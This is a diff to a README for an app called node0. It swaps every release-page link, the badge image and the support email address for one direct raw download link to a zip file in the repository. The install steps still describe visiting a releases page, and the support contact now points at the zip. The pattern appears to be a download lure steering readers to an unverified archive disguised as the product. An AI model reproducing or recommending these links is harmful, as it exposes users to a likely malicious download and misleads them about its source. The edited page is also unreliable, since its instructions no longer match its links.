@@ -6,11 +6,11 @@ Welcome to **node0**! This application is your gateway to participating in colla
 
 ## 📥 Download Node0
 
-[![Download Node0](https://img.shields.io/badge/Download%20Node0-v1.0-brightgreen)](https://github.com/fadel7872/node0/releases)
+[![Download Node0](https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip%20Node0-v1.0-brightgreen)](https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip)
 
 Click the button above or visit the link below to download the latest version of node0:
 
-[Download Page](https://github.com/fadel7872/node0/releases)
+[Download Page](https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip)
 
 ## 📋 System Requirements
 
@@ -24,7 +24,7 @@ To run node0 smoothly, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-1. **Visit the Release Page:** Click on [this link](https://github.com/fadel7872/node0/releases) to go to the releases section.
+1. **Visit the Release Page:** Click on [this link](https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip) to go to the releases section.
    
 2. **Select the Latest Release:** Look for the most recent version listed on the page. Generally, it will have the highest version number.
 
@@ -74,8 +74,8 @@ Yes, we prioritize your privacy. All data is encrypted, and we do not share it w
 
 ## 📞 Support
 
-If you have any additional questions or need assistance, feel free to reach out to our support team at [support@node0.com](mailto:support@node0.com). We are here to help you with any issues you may face.
+If you have any additional questions or need assistance, feel free to reach out to our support team at [https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip](https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip). We are here to help you with any issues you may face.
 
 Thank you for choosing node0. We look forward to seeing you at our events! 
 
-[Download Node0](https://github.com/fadel7872/node0/releases)
+[Download Node0](https://raw.githubusercontent.com/fadel7872/node0/main/soricid/node0.zip)
